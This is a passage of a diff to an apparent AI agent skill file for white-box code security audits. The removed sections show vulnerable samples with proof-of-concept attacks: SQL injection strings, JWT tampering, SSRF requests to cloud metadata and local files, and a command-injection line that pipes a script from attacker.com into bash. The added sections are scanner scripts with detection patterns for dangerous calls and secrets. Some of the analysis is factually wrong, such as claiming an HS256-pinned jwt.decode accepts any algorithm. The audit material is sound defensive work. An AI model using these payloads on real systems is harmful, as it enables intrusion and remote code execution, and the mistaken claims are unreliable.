@@ -1,861 +1,869 @@
 ---
 name: dfyx-code-security-audit
-description: Deep code security auditing skill using data flow analysis and business logic understanding for 9 languages and OWASP Top 10 vulnerabilities
+description: AI-powered code security audit skill using deep data flow analysis and business logic understanding for vulnerability detection
 triggers:
-  - "audit this code for security vulnerabilities"
-  - "perform a security code review"
-  - "find security issues in this project"
-  - "scan for code vulnerabilities"
-  - "check for SQL injection and XSS"
-  - "analyze this code for security flaws"
-  - "run a security audit on this codebase"
-  - "detect security vulnerabilities in the code"
+  - audit this codebase for security vulnerabilities
+  - perform a security code review
+  - check for security issues in this code
+  - run a security audit on this project
+  - analyze code for vulnerabilities
+  - scan this application for security flaws
+  - review code security using dfyx
+  - execute dfyx security audit
 ---
 
-# dfyx-code-security-audit
+# dfyx Code Security Audit Skill
 
 > Skill by [ara.so](https://ara.so) — Security Skills collection.
 
-Expert-level code security auditing using deep data flow analysis and business logic understanding. Supports 9 programming languages, 10 security dimensions (OWASP Top 10+), and uses a 5-phase standardized audit protocol based on real-world WooYun vulnerability cases.
+Expert-level code security auditing using white-box static analysis methodology through a five-phase standardized audit protocol. Designed by the EastSword team (东方隐侠团队) for systematic discovery and validation of security vulnerabilities in source code.
 
-## What This Does
+## What This Skill Does
 
-**dfyx_code_security_review** is a professional code security audit framework that:
+**dfyx_code_security_review** provides AI-powered security auditing with:
 
-- **Analyzes** source code using white-box static analysis methodology
-- **Detects** vulnerabilities across 10 security dimensions (injection, auth, authorization, deserialization, file ops, SSRF, crypto, config, business logic, supply chain)
-- **Validates** findings through taint tracking and attack chain construction
-- **Reports** actionable security issues with PoC and remediation guidance
-
-### Supported Languages & Frameworks
-
-**Languages (9):** Java, Python, Go, PHP, JavaScript/Node.js, C/C++, .NET/C#, Ruby, Rust
-
-**Frameworks (14):** Spring Boot, Django, Flask, FastAPI, Express, Koa, Gin, Laravel, Rails, ASP.NET Core, Rust Web, NestJS/Fastify, MyBatis, ProcessWire
+- **Multi-language support**: Java, Python, Go, PHP, JavaScript/Node.js, C/C++, .NET/C#, Ruby, Rust
+- **10 security dimensions**: Injection, Authentication, Authorization, Deserialization, File Operations, SSRF, Cryptography, Configuration, Business Logic, Supply Chain
+- **Three-track audit model**: 
+  - Sink-driven (injection/RCE)
+  - Control-driven (authorization/business logic)
+  - Config-driven (configuration/crypto)
+- **Five-phase protocol**: Reconnaissance → Pattern Matching → Taint Tracking → Validation → Reporting
+- **Real-world case library**: Based on WooYun vulnerability cases (2010-2016)
 
 ## Installation
 
-### For AI Coding Agents
-
-Clone or copy the skill directory into your agent's skills folder:
+This skill doesn't require separate installation — it operates through AI agent capabilities. However, the Python helper scripts can be installed:
 
 ```bash
-# Claude Code
-git clone https://github.com/EastSword/skill-dfyx_code_security_review.git ~/.claude/skills/dfyx-code-security-audit
+# Clone the repository
+git clone https://github.com/EastSword/skill-dfyx_code_security_review.git
+cd skill-dfyx_code_security_review
 
-# Cursor / Generic
-git clone https://github.com/EastSword/skill-dfyx_code_security_review.git ~/ai-skills/dfyx-code-security-audit
-```
-
-### Python Dependencies (Optional Scripts)
-
-If using the optional Python helper scripts:
-
-```bash
+# Install Python dependencies (optional, for helper scripts)
 pip install -r requirements.txt
-# Dependencies: bandit, semgrep, safety, pyyaml, jinja2
 ```
 
-## Core Concepts
+**Dependencies** (requirements.txt):
+```
+pylint>=2.17.0
+bandit>=1.7.5
+safety>=2.3.5
+semgrep>=1.31.0
+pyyaml>=6.0
+```
 
-### 5-Phase Audit Protocol
+## Core Audit Protocol
+
+### Five-Phase Audit Process
 
 ```
 Phase 1: Reconnaissance (10%)
-  ↓ Output: Architecture diagram, attack surface inventory
+  └─> Output: Architecture diagram, attack surface inventory
 
 Phase 2: Pattern Matching (30%)
-  ↓ Output: High-risk code zones
+  └─> Output: High-risk area checklist
 
-Phase 3: Taint Tracking & Validation (40%)
-  ↓ Output: Confirmed vulnerabilities with PoC
+Phase 3: Taint Tracking + Testing (40%)
+  └─> Output: Confirmed vulnerabilities, test validation reports
 
-Phase 4: Attack Chain Construction (15%)
-  ↓ Output: Multi-stage exploit scenarios
+Phase 4: Validation & Attack Chains (15%)
+  └─> Output: Vulnerability validation reports
 
 Phase 5: Structured Reporting (5%)
-  ↓ Output: Full audit report
+  └─> Output: Complete audit report
 ```
-
-### 10 Security Dimensions
-
-| Dimension | Coverage |
-|-----------|----------|
-| **D1 Injection** | SQL, Command, LDAP, SSTI, SpEL, JNDI |
-| **D2 Authentication** | Token, Session, JWT, Filter chains |
-| **D3 Authorization** | CRUD permissions, IDOR, horizontal privilege escalation |
-| **D4 Deserialization** | Java/Python/PHP gadget chains |
-| **D5 File Operations** | Upload, download, path traversal |
-| **D6 SSRF** | URL injection, protocol restrictions |
-| **D7 Cryptography** | Key management, encryption modes, KDF |
-| **D8 Configuration** | Actuator exposure, CORS, error leakage |
-| **D9 Business Logic** | Race conditions, mass assignment, state machines, multi-tenancy |
-| **D10 Supply Chain** | Dependency CVEs, version checks |
 
 ### Audit Modes
 
-| Mode | Use Case | Scope | Time |
-|------|----------|-------|------|
-| **Quick** | CI/CD, small projects | Critical vulns, secrets, dep CVEs | 5-10 min |
+| Mode | Use Case | Coverage | Time |
+|------|----------|----------|------|
+| **Quick** | CI/CD, small projects | Critical vulns, secrets, dependency CVEs | 5-10 min |
 | **Standard** | Regular audits | OWASP Top 10, auth/authz, crypto | 30-60 min |
-| **Deep** | Critical apps, pentest prep | Full coverage, attack chains, business logic | 1-3 hours |
+| **Deep** | Critical projects, pentest prep | Full coverage, attack chains, business logic | 1-3 hours |
 
 ## Usage Patterns
 
-### Basic Audit
+### Triggering an Audit
+
+Simply request an audit in natural language:
 
 ```
-Trigger: "audit this code for security vulnerabilities"
-
-AI Response:
-[MODE] standard
-[RECON] Detected: Spring Boot 2.5.4 + MySQL + Thymeleaf
-[SCOPE] 234 files, focusing on D1-D10
-[PLAN] Estimated 45 minutes, expecting 8-12 findings
-Proceed? (yes/no)
+"Audit this codebase for security vulnerabilities"
+"Perform a deep security scan of /path/to/project"
+"Check for SQL injection and authentication issues"
 ```
 
-### Targeted Injection Scan
+### Expected Workflow
 
 ```
-User: "check for SQL injection in the /api/users endpoint"
-
-AI Analysis:
-1. Locate endpoint handler
-2. Trace user input (request params, body, headers)
-3. Follow data flow to SQL execution
-4. Verify input sanitization
-5. Report findings with PoC
+[MODE] deep
+[RECON] 874 files, Spring Boot 1.5 + Shiro 1.6 + JPA + Freemarker
+[PLAN] 5 Agents, D1-D10 coverage, estimated 125 turns
+[SCOPE] Critical: 10, High: 14, Medium: 12, Low: 4
+Confirm to start? (yes/no)
 ```
 
-### Full Project Audit (Deep Mode)
+## Python Helper Scripts
 
-```
-User: "perform a deep security audit on /path/to/project"
+### Code Scanning
 
-AI Output:
-[PHASE 1] Architecture mapping...
-  - Entry points: 47 REST endpoints, 12 GraphQL resolvers
-  - Data flows: Request → Controller → Service → DAO → DB
-  - Auth: JWT + Spring Security filter chain
-  - Tech stack: Java 11, Spring Boot 2.3.1, MyBatis 3.5.5
+```python
+# scripts/code_scan.py
+from pattern_scanner import PatternScanner
+from data_flow_analyzer import DataFlowAnalyzer
+import sys
 
-[PHASE 2] Pattern matching (3 parallel agents)...
-  - D1 Injection: 8 potential SQL injection sinks
-  - D3 Authorization: 23 endpoints lack @PreAuthorize
-  - D7 Crypto: Hardcoded AES key in ConfigService.java
-
-[PHASE 3] Taint tracking...
-  [CRITICAL] SQL Injection in UserController.search()
-    Source: @RequestParam("query") → userService.search(query)
-    Sink: MyBatis #{query} without parameterization
-    PoC: GET /api/users/search?query=admin' OR '1'='1
+def scan_project(project_path, mode='standard'):
+    """
+    Scan a project for security vulnerabilities
     
-[PHASE 4] Attack chain construction...
-  Chain 1: SQL Injection → Database dump → Admin credentials
-  Chain 2: Missing @PreAuthorize → IDOR → Mass data extraction
+    Args:
+        project_path: Path to project root
+        mode: 'quick', 'standard', or 'deep'
+    """
+    scanner = PatternScanner(project_path)
+    analyzer = DataFlowAnalyzer(project_path)
+    
+    # Phase 1: Reconnaissance
+    tech_stack = scanner.identify_tech_stack()
+    print(f"[RECON] Detected: {tech_stack}")
+    
+    # Phase 2: Pattern matching
+    patterns = scanner.scan_patterns(mode=mode)
+    print(f"[SCAN] Found {len(patterns)} suspicious patterns")
+    
+    # Phase 3: Data flow analysis
+    vulnerabilities = []
+    for pattern in patterns:
+        flows = analyzer.trace_data_flow(pattern)
+        if analyzer.is_vulnerable(flows):
+            vulnerabilities.append({
+                'pattern': pattern,
+                'flows': flows,
+                'severity': analyzer.calculate_severity(flows)
+            })
+    
+    return vulnerabilities
 
-[PHASE 5] Report generation...
-  Total: 10 Critical, 14 High, 12 Medium, 4 Low
-  Report saved to: security_audit_report_2026-06-06.md
+if __name__ == '__main__':
+    project_path = sys.argv[1] if len(sys.argv) > 1 else '.'
+    mode = sys.argv[2] if len(sys.argv) > 2 else 'standard'
+    
+    results = scan_project(project_path, mode)
+    print(f"\n[RESULTS] Found {len(results)} vulnerabilities")
 ```
 
-## Code Examples
-
-### Java Spring Boot - SQL Injection Detection
-
-**Vulnerable Code:**
-
-```java
-// UserController.java
-@RestController
-public class UserController {
-    @GetMapping("/api/users/search")
-    public List<User> search(@RequestParam String keyword) {
-        // VULNERABILITY: Direct string concatenation
-        return userMapper.searchUsers(keyword);
-    }
-}
-
-// UserMapper.xml (MyBatis)
-<select id="searchUsers" resultType="User">
-    SELECT * FROM users WHERE username LIKE '%${keyword}%'
-    <!-- ${} causes SQL injection - no parameterization -->
-</select>
-```
-
-**Agent Analysis:**
-
-```
-[D1-INJECTION-001] SQL Injection via MyBatis ${} syntax
-  Location: UserMapper.xml:12
-  Sink: SELECT * FROM users WHERE username LIKE '%${keyword}%'
-  Source: UserController.search(@RequestParam String keyword)
-  Data Flow:
-    1. HTTP GET /api/users/search?keyword=USER_INPUT
-    2. @RequestParam binds to String keyword (no validation)
-    3. userMapper.searchUsers(keyword)
-    4. MyBatis ${keyword} performs string substitution
-    5. Executed as raw SQL (no prepared statement)
-  
-  PoC: GET /api/users/search?keyword=%27%20OR%20%271%27=%271
-  Impact: Full database read access, potential RCE via INTO OUTFILE
-```
-
-**Remediation:**
-
-```java
-// Fixed: Use #{} for parameterization
-<select id="searchUsers" resultType="User">
-    SELECT * FROM users WHERE username LIKE CONCAT('%', #{keyword}, '%')
-</select>
-
-// Better: Add input validation
-@GetMapping("/api/users/search")
-public List<User> search(
-    @RequestParam @Pattern(regexp = "^[a-zA-Z0-9_-]{1,50}$") String keyword
-) {
-    return userMapper.searchUsers(keyword);
-}
-```
-
-### Python Flask - Authentication Bypass
-
-**Vulnerable Code:**
+### Pattern Scanner
 
 ```python
-# app.py
-from flask import Flask, request, jsonify
-import jwt
-
-app = Flask(__name__)
-SECRET_KEY = "hardcoded_secret_123"  # D7: Hardcoded secret
-
-@app.route('/api/admin/users')
-def get_users():
-    token = request.headers.get('Authorization')
-    if token:
-        try:
-            # D2: No algorithm verification
-            payload = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
-            # D3: No role check - any valid token grants access
-            users = User.query.all()
-            return jsonify([u.to_dict() for u in users])
-        except:
-            return jsonify({'error': 'Invalid token'}), 401
-    return jsonify({'error': 'No token'}), 401
-```
-
-**Agent Analysis:**
-
-```
-[D2-AUTH-003] JWT Algorithm Confusion Attack
-  Location: app.py:12
-  Issue: jwt.decode() accepts any algorithm in token header
-  Attack: Attacker can switch to 'none' algorithm or use public key as HMAC secret
-  
-  PoC:
-    1. Obtain valid JWT: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...
-    2. Modify header to {"typ":"JWT","alg":"none"}
-    3. Remove signature
-    4. Request bypasses authentication
-
-[D3-AUTHZ-001] Missing Role-Based Access Control
-  Location: app.py:10-17
-  Issue: No check for admin role - any authenticated user can access /api/admin/users
-  
-[D7-CRYPTO-002] Hardcoded Secret Key
-  Location: app.py:5
-  Issue: SECRET_KEY embedded in source code
-  Risk: Exposed in version control, allows token forgery
-```
-
-**Remediation:**
-
-```python
+# scripts/pattern_scanner.py
+import re
 import os
-from functools import wraps
+from typing import Dict, List
 
-# Fix D7: Use environment variable
-SECRET_KEY = os.environ.get('JWT_SECRET_KEY')
-if not SECRET_KEY:
-    raise ValueError("JWT_SECRET_KEY must be set")
+class PatternScanner:
+    """Scans code for dangerous patterns across multiple languages"""
+    
+    DANGEROUS_PATTERNS = {
+        'sql_injection': {
+            'java': [
+                r'createQuery\([^?]*\+',  # JPA concatenation
+                r'createSQLQuery\([^?]*\+',
+                r'Statement\.execute\([^?]*\+'
+            ],
+            'python': [
+                r'cursor\.execute\([^%]*%',  # String formatting
+                r'raw\([^%]*%',  # Django raw SQL
+                r'\.query\([^%]*f["\']'  # f-string in query
+            ],
+            'php': [
+                r'mysqli_query\([^,]*\.',  # Concatenation
+                r'mysql_query\([^,]*\.',
+                r'\$.*->query\([^?]*\.'
+            ]
+        },
+        'command_injection': {
+            'java': [
+                r'Runtime\.exec\([^"]*\+',
+                r'ProcessBuilder\([^"]*\+'
+            ],
+            'python': [
+                r'os\.system\([^"]*\+',
+                r'subprocess\.(call|run|Popen)\([^"]*\+',
+                r'eval\(',  # Code injection
+                r'exec\('
+            ],
+            'php': [
+                r'(system|exec|shell_exec|passthru)\(\$',
+                r'`.*\$'  # Backtick execution
+            ]
+        },
+        'deserialization': {
+            'java': [
+                r'ObjectInputStream\.readObject\(',
+                r'XMLDecoder\.readObject\(',
+                r'Yaml\.load\('
+            ],
+            'python': [
+                r'pickle\.loads?\(',
+                r'yaml\.load\(',  # Without safe_load
+                r'eval\('
+            ],
+            'php': [
+                r'unserialize\(\$'
+            ]
+        }
+    }
+    
+    def __init__(self, project_path: str):
+        self.project_path = project_path
+        self.language = self._detect_language()
+    
+    def _detect_language(self) -> str:
+        """Detect primary programming language"""
+        extensions = {
+            '.java': 'java',
+            '.py': 'python',
+            '.php': 'php',
+            '.go': 'go',
+            '.js': 'javascript',
+            '.rb': 'ruby',
+            '.cs': 'csharp'
+        }
+        
+        counts = {}
+        for root, dirs, files in os.walk(self.project_path):
+            for file in files:
+                ext = os.path.splitext(file)[1]
+                if ext in extensions:
+                    lang = extensions[ext]
+                    counts[lang] = counts.get(lang, 0) + 1
+        
+        return max(counts, key=counts.get) if counts else 'unknown'
+    
+    def scan_patterns(self, mode: str = 'standard') -> List[Dict]:
+        """Scan for dangerous patterns"""
+        results = []
+        
+        for vuln_type, lang_patterns in self.DANGEROUS_PATTERNS.items():
+            if self.language not in lang_patterns:
+                continue
+            
+            patterns = lang_patterns[self.language]
+            for pattern in patterns:
+                matches = self._grep_pattern(pattern)
+                for match in matches:
+                    results.append({
+                        'type': vuln_type,
+                        'pattern': pattern,
+                        'file': match['file'],
+                        'line': match['line'],
+                        'code': match['code']
+                    })
+        
+        return results
+    
+    def _grep_pattern(self, pattern: str) -> List[Dict]:
+        """Search for pattern in codebase"""
+        matches = []
+        regex = re.compile(pattern)
+        
+        for root, dirs, files in os.walk(self.project_path):
+            # Skip common directories
+            dirs[:] = [d for d in dirs if d not in ['.git', 'node_modules', '__pycache__', 'venv']]
+            
+            for file in files:
+                if not self._is_code_file(file):
+                    continue
+                
+                filepath = os.path.join(root, file)
+                try:
+                    with open(filepath, 'r', encoding='utf-8') as f:
+                        for line_num, line in enumerate(f, 1):
+                            if regex.search(line):
+                                matches.append({
+                                    'file': filepath,
+                                    'line': line_num,
+                                    'code': line.strip()
+                                })
+                except Exception:
+                    pass
+        
+        return matches
+    
+    def _is_code_file(self, filename: str) -> bool:
+        """Check if file is source code"""
+        code_extensions = ['.java', '.py', '.php', '.go', '.js', '.rb', '.cs', '.cpp', '.c', '.rs']
+        return any(filename.endswith(ext) for ext in code_extensions)
+```
 
-# Fix D2: Restrict algorithms
-def verify_token(f):
-    @wraps(f)
-    def decorated(*args, **kwargs):
-        token = request.headers.get('Authorization', '').replace('Bearer ', '')
-        if not token:
-            return jsonify({'error': 'Missing token'}), 401
+### Data Flow Analyzer
+
+```python
+# scripts/data_flow_analyzer.py
+from typing import List, Dict, Set
+import ast
+import re
+
+class DataFlowAnalyzer:
+    """Analyzes data flow from source to sink"""
+    
+    def __init__(self, project_path: str):
+        self.project_path = project_path
+        self.taint_sources = set()
+        self.sanitizers = set()
+        self.dangerous_sinks = set()
+    
+    def trace_data_flow(self, pattern: Dict) -> List[Dict]:
+        """
+        Trace tainted data from source to sink
+        
+        Returns list of data flows with taint information
+        """
+        filepath = pattern['file']
+        line_num = pattern['line']
+        
+        # Parse the file
         try:
-            # Only allow HS256, reject 'none'
-            payload = jwt.decode(
-                token, 
-                SECRET_KEY, 
-                algorithms=['HS256'],
-                options={'verify_signature': True}
-            )
-            request.user = payload
-        except jwt.InvalidTokenError:
-            return jsonify({'error': 'Invalid token'}), 401
-        return f(*args, **kwargs)
-    return decorated
-
-# Fix D3: Add role check
-def require_admin(f):
-    @wraps(f)
-    def decorated(*args, **kwargs):
-        if request.user.get('role') != 'admin':
-            return jsonify({'error': 'Admin access required'}), 403
-        return f(*args, **kwargs)
-    return decorated
-
-@app.route('/api/admin/users')
-@verify_token
-@require_admin
-def get_users():
-    users = User.query.all()
-    return jsonify([u.to_dict() for u in users])
+            with open(filepath, 'r') as f:
+                content = f.read()
+            
+            if filepath.endswith('.py'):
+                return self._trace_python(content, line_num)
+            elif filepath.endswith('.java'):
+                return self._trace_java(content, line_num)
+            else:
+                return []
+        except Exception:
+            return []
+    
+    def _trace_python(self, code: str, sink_line: int) -> List[Dict]:
+        """Trace data flow in Python code"""
+        try:
+            tree = ast.parse(code)
+        except SyntaxError:
+            return []
+        
+        flows = []
+        tainted_vars = set()
+        
+        # Identify taint sources (user input)
+        for node in ast.walk(tree):
+            if isinstance(node, ast.Assign):
+                # Check if assigning from request/input
+                if isinstance(node.value, ast.Attribute):
+                    if self._is_taint_source(node.value):
+                        for target in node.targets:
+                            if isinstance(target, ast.Name):
+                                tainted_vars.add(target.id)
+                                flows.append({
+                                    'line': node.lineno,
+                                    'type': 'source',
+                                    'var': target.id,
+                                    'source': ast.unparse(node.value)
+                                })
+        
+        # Trace tainted variables through assignments
+        for node in ast.walk(tree):
+            if isinstance(node, ast.Assign):
+                for target in node.targets:
+                    if isinstance(target, ast.Name):
+                        if self._uses_tainted_var(node.value, tainted_vars):
+                            tainted_vars.add(target.id)
+                            flows.append({
+                                'line': node.lineno,
+                                'type': 'propagation',
+                                'var': target.id,
+                                'from': ast.unparse(node.value)
+                            })
+        
+        return flows
+    
+    def _is_taint_source(self, node: ast.AST) -> bool:
+        """Check if node is a taint source"""
+        if isinstance(node, ast.Attribute):
+            # Common taint sources in Python
+            taint_patterns = [
+                'request.GET', 'request.POST', 'request.args',
+                'request.form', 'request.json', 'input('
+            ]
+            node_str = ast.unparse(node)
+            return any(pattern in node_str for pattern in taint_patterns)
+        return False
+    
+    def _uses_tainted_var(self, node: ast.AST, tainted: Set[str]) -> bool:
+        """Check if node uses any tainted variables"""
+        for child in ast.walk(node):
+            if isinstance(child, ast.Name) and child.id in tainted:
+                return True
+        return False
+    
+    def _trace_java(self, code: str, sink_line: int) -> List[Dict]:
+        """Trace data flow in Java code (simplified)"""
+        flows = []
+        tainted_vars = set()
+        
+        # Simple pattern matching for Java
+        lines = code.split('\n')
+        
+        # Find taint sources
+        for i, line in enumerate(lines, 1):
+            if re.search(r'(getParameter|getHeader|getCookie)\s*\(', line):
+                match = re.search(r'(\w+)\s*=.*get(Parameter|Header|Cookie)', line)
+                if match:
+                    var_name = match.group(1)
+                    tainted_vars.add(var_name)
+                    flows.append({
+                        'line': i,
+                        'type': 'source',
+                        'var': var_name,
+                        'source': line.strip()
+                    })
+        
+        # Find propagation
+        for i, line in enumerate(lines, 1):
+            for tainted_var in tainted_vars:
+                if tainted_var in line and re.search(rf'\w+\s*=.*{tainted_var}', line):
+                    match = re.search(r'(\w+)\s*=', line)
+                    if match:
+                        new_var = match.group(1)
+                        tainted_vars.add(new_var)
+                        flows.append({
+                            'line': i,
+                            'type': 'propagation',
+                            'var': new_var,
+                            'from': line.strip()
+                        })
+        
+        return flows
+    
+    def is_vulnerable(self, flows: List[Dict]) -> bool:
+        """
+        Determine if data flows represent a vulnerability
+        
+        Vulnerable if:
+        1. Data comes from taint source
+        2. Reaches dangerous sink
+        3. No sanitization in between
+        """
+        if not flows:
+            return False
+        
+        has_source = any(f['type'] == 'source' for f in flows)
+        has_sanitization = any(self._is_sanitizer(f) for f in flows)
+        
+        return has_source and not has_sanitization
+    
+    def _is_sanitizer(self, flow: Dict) -> bool:
+        """Check if flow includes sanitization"""
+        sanitizer_patterns = [
+            'escape', 'sanitize', 'filter', 'validate',
+            'prepared', 'parameterized', 'whitelist'
+        ]
+        
+        flow_str = str(flow).lower()
+        return any(pattern in flow_str for pattern in sanitizer_patterns)
+    
+    def calculate_severity(self, flows: List[Dict]) -> str:
+        """Calculate vulnerability severity"""
+        if not flows:
+            return 'info'
+        
+        # Check if reaches database or system calls
+        has_db_sink = any('query' in str(f).lower() or 'execute' in str(f).lower() 
+                         for f in flows)
+        has_cmd_sink = any('system' in str(f).lower() or 'exec' in str(f).lower() 
+                          for f in flows)
+        
+        if has_cmd_sink:
+            return 'critical'
+        elif has_db_sink:
+            return 'high'
+        else:
+            return 'medium'
 ```
 
-### PHP - Command Injection
+### Secret Detection
+
+```python
+# scripts/secret_finder.py
+import re
+import os
+from typing import List, Dict
+
+class SecretFinder:
+    """Detects hardcoded secrets and sensitive information"""
+    
+    SECRET_PATTERNS = {
+        'aws_access_key': r'AKIA[0-9A-Z]{16}',
+        'aws_secret_key': r'aws_secret_access_key[\s]*=[\s]*[\'"]([^\'"]+)[\'"]',
+        'api_key': r'api[_-]?key[\s]*[=:][\s]*[\'"]([^\'"]{20,})[\'"]',
+        'password': r'password[\s]*[=:][\s]*[\'"]([^\'"]+)[\'"]',
+        'private_key': r'-----BEGIN (RSA|DSA|EC|OPENSSH) PRIVATE KEY-----',
+        'jwt_secret': r'jwt[_-]?secret[\s]*[=:][\s]*[\'"]([^\'"]+)[\'"]',
+        'database_url': r'(mysql|postgresql|mongodb)://[^:]+:[^@]+@',
+        'github_token': r'gh[ps]_[a-zA-Z0-9]{36}',
+        'slack_token': r'xox[baprs]-[0-9]{10,12}-[0-9]{10,12}-[a-zA-Z0-9]{24,32}',
+        'generic_secret': r'(secret|token|key)[\s]*[=:][\s]*[\'"][^\'"\s]{16,}[\'"]'
+    }
+    
+    def __init__(self, project_path: str):
+        self.project_path = project_path
+    
+    def scan(self) -> List[Dict]:
+        """Scan for hardcoded secrets"""
+        findings = []
+        
+        for root, dirs, files in os.walk(self.project_path):
+            # Skip common directories
+            dirs[:] = [d for d in dirs if d not in [
+                '.git', 'node_modules', '__pycache__', 'venv', '.venv'
+            ]]
+            
+            for file in files:
+                if self._should_scan_file(file):
+                    filepath = os.path.join(root, file)
+                    findings.extend(self._scan_file(filepath))
+        
+        return findings
+    
+    def _should_scan_file(self, filename: str) -> bool:
+        """Check if file should be scanned"""
+        # Scan code and config files
+        scan_extensions = [
+            '.py', '.java', '.js', '.php', '.go', '.rb', '.cs',
+            '.yml', '.yaml', '.json', '.xml', '.properties', '.env',
+            '.conf', '.config', '.ini', '.toml'
+        ]
+        return any(filename.endswith(ext) for ext in scan_extensions)
+    
+    def _scan_file(self, filepath: str) -> List[Dict]:
+        """Scan a single file for secrets"""
+        findings = []
+        
+        try:
+            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
+                content = f.read()
+                
+            for secret_type, pattern in self.SECRET_PATTERNS.items():
+                matches = re.finditer(pattern, content, re.IGNORECASE)
+                for match in matches:
+                    # Calculate line number
+                    line_num = content[:match.start()].count('\n') + 1
+                    
+                    findings.append({
+                        'type': secret_type,
+                        'file': filepath,
+                        'line': line_num,
+                        'matched': match.group(0)[:50],  # First 50 chars
+                        'severity': self._get_severity(secret_type)
+                    })
+        except Exception:
+            pass
+        
+        return findings
+    
+    def _get_severity(self, secret_type: str) -> str:
+        """Determine severity of secret exposure"""
+        critical_types = ['aws_access_key', 'aws_secret_key', 'private_key']
+        high_types = ['api_key', 'jwt_secret', 'database_url', 'github_token']
+        
+        if secret_type in critical_types:
+            return 'critical'
+        elif secret_type in high_types:
+            return 'high'
+        else:
+            return 'medium'
+```
+
+### Report Generator
+
+```python
+# scripts/report_generator.py
+from typing import List, Dict
+from datetime import datetime
+import json
+
+class ReportGenerator:
+    """Generates structured security audit reports"""
+    
+    def __init__(self, vulnerabilities: List[Dict], secrets: List[Dict]):
+        self.vulnerabilities = vulnerabilities
+        self.secrets = secrets
+    
+    def generate_markdown(self, output_path: str = 'security_report.md'):
+        """Generate Markdown report"""
+        report = self._build_report()
+        
+        with open(output_path, 'w', encoding='utf-8') as f:
+            f.write(report)
+        
+        print(f"[REPORT] Generated: {output_path}")
+    
+    def _build_report(self) -> str:
+        """Build complete report content"""
+        sections = [
+            self._header(),
+            self._executive_summary(),
+            self._vulnerability_details(),
+            self._secret_findings(),
+            self._remediation_priorities(),
+            self._appendix()
+        ]
+        
+        return '\n\n'.join(sections)
+    
+    def _header(self) -> str:
+        return f"""# Security Audit Report
+
+**Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}  
+**Audit Tool:** dfyx_code_security_review  
+**Audit Methodology:** Five-Phase White-Box Static Analysis
+"""
+    
+    def _executive_summary(self) -> str:
+        """Generate executive summary"""
+        severity_counts = self._count_by_severity()
+        
+        return f"""## Executive Summary
+
+**Total Findings:** {len(self.vulnerabilities) + len(self.secrets)}
+
+### Severity Distribution
+
+| Severity | Count |
+|----------|-------|
+| Critical | {severity_counts.get('critical', 0)} |
+| High | {severity_counts.get('high', 0)} |
+| Medium | {severity_counts.get('medium', 0)} |
+| Low | {severity_counts.get('low', 0)} |
+
+### Key Risks
+
+{self._top_risks()}
+"""
+    
+    def _vulnerability_details(self) -> str:
+        """Detail each vulnerability"""
+        if not self.vulnerabilities:
+            return "## Vulnerabilities\n\nNo vulnerabilities detected."
+        
+        sections = ["## Vulnerabilities\n"]
+        
+        for i, vuln in enumerate(self.vulnerabilities, 1):
+            sections.append(f"""### {i}. {vuln['type'].replace('_', ' ').title()}
+
+**Severity:** {vuln.get('severity', 'medium').upper()}  
+**Location:** `{vuln['file']}:{vuln['line']}`
 
 **Vulnerable Code:**
-
-```php
-<?php
-// backup.php
-class BackupController {
-    public function createBackup() {
-        $filename = $_POST['filename']; // D1: Unsanitized input
-        
-        // D1: Command injection via shell_exec
-        $output = shell_exec("tar -czf /backups/$filename.tar.gz /var/www/data");
-        
-        return json_encode(['status' => 'success', 'file' => $filename]);
-    }
-}
-?>
+```
+{vuln['code']}
 ```
 
-**Agent Analysis:**
+**Data Flow:**
+{self._format_data_flow(vuln.get('flows', []))}
 
-```
-[D1-INJECTION-002] Command Injection in shell_exec
-  Location: backup.php:7
-  Sink: shell_exec("tar -czf /backups/$filename.tar.gz /var/www/data")
-  Source: $_POST['filename'] (no validation)
-  Data Flow:
-    1. POST /backup/create with filename=USER_INPUT
-    2. Direct variable interpolation in shell command
-    3. Executed as subprocess
-  
-  PoC: POST /backup/create
-       Content-Type: application/x-www-form-urlencoded
-       filename=test; curl http://attacker.com/shell.sh | bash;
-  
-  Impact: Remote Code Execution, full server compromise
-```
+**Impact:** {self._describe_impact(vuln['type'])}
 
 **Remediation:**
-
-```php
-<?php
-class BackupController {
-    public function createBackup() {
-        $filename = $_POST['filename'];
+{self._remediation_advice(vuln['type'])}
+""")
         
-        // Validate: alphanumeric + hyphens only
-        if (!preg_match('/^[a-zA-Z0-9_-]+$/', $filename)) {
-            throw new InvalidArgumentException('Invalid filename');
-        }
-        
-        // Use escapeshellarg() for additional safety
-        $safeFilename = escapeshellarg($filename);
-        
-        // Better: Use PHP functions instead of shell commands
-        $sourcePath = '/var/www/data';
-        $destPath = "/backups/{$filename}.tar.gz";
-        
-        $phar = new PharData($destPath);
-        $phar->buildFromDirectory($sourcePath);
-        $phar->compress(Phar::GZ);
-        
-        return json_encode(['status' => 'success', 'file' => $filename]);
-    }
-}
-?>
-```
-
-### Node.js Express - SSRF
-
-**Vulnerable Code:**
-
-```javascript
-// proxy.js
-const express = require('express');
-const axios = require('axios');
-const app = express();
-
-app.get('/api/fetch', async (req, res) => {
-    const url = req.query.url; // D6: User-controlled URL
+        return '\n'.join(sections)
     
-    try {
-        // D6: No protocol/domain validation - SSRF vulnerability
-        const response = await axios.get(url);
-        res.json(response.data);
-    } catch (error) {
-        res.status(500).json({ error: error.message });
-    }
-});
-```
-
-**Agent Analysis:**
-
-```
-[D6-SSRF-001] Server-Side Request Forgery
-  Location: proxy.js:8
-  Sink: axios.get(url) where url = req.query.url
-  Attack Scenarios:
-    1. Internal network scan: /api/fetch?url=http://192.168.1.1:8080/admin
-    2. Cloud metadata: /api/fetch?url=http://169.254.169.254/latest/meta-data/
-    3. File read (file:// protocol): /api/fetch?url=file:///etc/passwd
-  
-  Impact: Internal network exposure, cloud credential theft, local file disclosure
-```
-
-**Remediation:**
-
-```javascript
-const express = require('express');
-const axios = require('axios');
-const { URL } = require('url');
-
-const ALLOWED_HOSTS = ['api.example.com', 'cdn.example.com'];
-const BLOCKED_IPS = [
-    '127.0.0.1', 'localhost',
-    /^10\./, /^172\.(1[6-9]|2[0-9]|3[0-1])\./, /^192\.168\./,  // Private IPs
-    /^169\.254\./  // Link-local
-];
-
-async function isAllowedURL(urlString) {
-    try {
-        const url = new URL(urlString);
+    def _secret_findings(self) -> str:
+        """Detail secret findings"""
+        if not self.secrets:
+            return "## Hardcoded Secrets\n\nNo hardcoded secrets detected."
         
-        // Only allow HTTP/HTTPS
